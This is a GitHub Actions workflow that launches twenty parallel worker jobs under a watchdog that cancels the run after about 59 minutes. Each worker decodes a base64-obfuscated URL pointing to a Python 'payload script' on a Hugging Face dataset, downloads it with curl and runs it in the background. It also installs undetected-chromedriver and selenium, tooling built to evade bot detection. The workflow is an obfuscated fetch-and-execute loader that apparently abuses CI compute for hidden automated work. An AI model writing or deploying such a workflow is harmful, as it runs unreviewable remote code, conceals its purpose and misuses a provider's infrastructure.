name: Horizon Engine Matrix Core

on:
  workflow_dispatch:

concurrency:
  group: horizon-core-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Overseer: Cancels the entire pipeline run after the specified delay
  # =================================================================
  overseer-watchdog:
    name: "System Overseer"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      WATCH_TIMEOUT_SEC: 3540
    steps:
      - name: Initialize Watchdog Monitor
        run: |
          echo "[MONITOR] Watchdog initiated for workflow execution: ${{ github.run_id }}"
          echo "[MONITOR] Entering standby state for ${WATCH_TIMEOUT_SEC} seconds..."

          sleep "${WATCH_TIMEOUT_SEC}"

          echo "[MONITOR] Timeout threshold reached. Issuing workflow abort command."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[MONITOR] Abort request sent successfully. Halting active nodes."

  # =================================================================
  # Processing Nodes: Parallel execution matrix
  # =================================================================
  worker-nodes:
    name: "Worker-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [N101, N102, N103, N104, N105, N106, N107, N108, N109, N110, N111, N112, N113, N114, N115, N116, N117, N118, N119, N200]

    steps:
      # Step 1: Environment Setup
      - name: Bootstrap Environment
        run: |
          echo "[INIT] Setting up environment on Worker-${{ matrix.node_code }}..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # Step 2: Fetch Remote Script
      - name: Fetch Remote Task File
        run: |
          echo "[FETCH] Pulling target payload script..."
          REMOTE_PAYLOAD_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$REMOTE_PAYLOAD_URL" -o worker_task.py
          echo "[FETCH] Payload script fetched successfully."

      # Step 3: Install Required Dependencies
      - name: Deploy Python Libraries
        run: |
          echo "[DEPS] Installing required runtime packages..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # Step 4: Execute Main Process
      - name: Execute Task Process
        run: |
          echo "[EXEC] Launching Worker-${{ matrix.node_code }} main task..."

          python3 worker_task.py &
          TASK_PID=$!

          echo "[EXEC] Process started (PID: $TASK_PID). Max execution duration: 3540s."

          sleep 3540

          if kill -0 "$TASK_PID" 2>/dev/null; then
            echo "[EXEC] Execution limit exceeded — sending termination signal."
            kill -9 "$TASK_PID"
            echo "[EXEC] Process killed."
          else
            echo "[EXEC] Process finalized prior to limit."
          fi
